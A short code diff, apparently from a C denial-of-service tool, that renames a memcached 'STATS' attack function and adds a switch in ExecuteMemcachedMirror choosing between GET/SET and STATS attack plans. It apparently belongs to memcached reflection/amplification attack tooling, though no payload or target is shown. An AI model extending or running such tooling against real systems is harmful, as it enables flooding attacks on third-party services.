@@ -30,7 +30,7 @@ static AttackPlan * createAttackDataGETSET( AttackDraft *draft )
   return newData;
 }
 
-static AttackPlan * createAttackDataSTAT( AttackDraft *draft )
+static AttackPlan * createAttackDataSTATS( AttackDraft *draft )
 {
   AttackPlan *newData;
   int arg;
@@ -67,10 +67,22 @@ void executeAttack( AttackPlan * atkData )
   
 }
 
-int  ExecuteMemcachedMirror( void *draft )
+int  ExecuteMemcachedMirror( void *p_draft )
 {
     AttackPlan *plan;
-    plan = createAttackDataGETSET( draft );
+    AttackDraft *draft = (AttackDraft *) p_draft;
+
+    switch( draft->type )
+    {
+        case MEMCACHED_GETSET:
+            plan = createAttackDataGETSET( draft );
+            break;
+
+        case MEMCACHED_STATS:
+        default:
+            plan = createAttackDataSTATS( draft );
+            break;
+    }
     executeAttack(plan);
     return 0;
 }
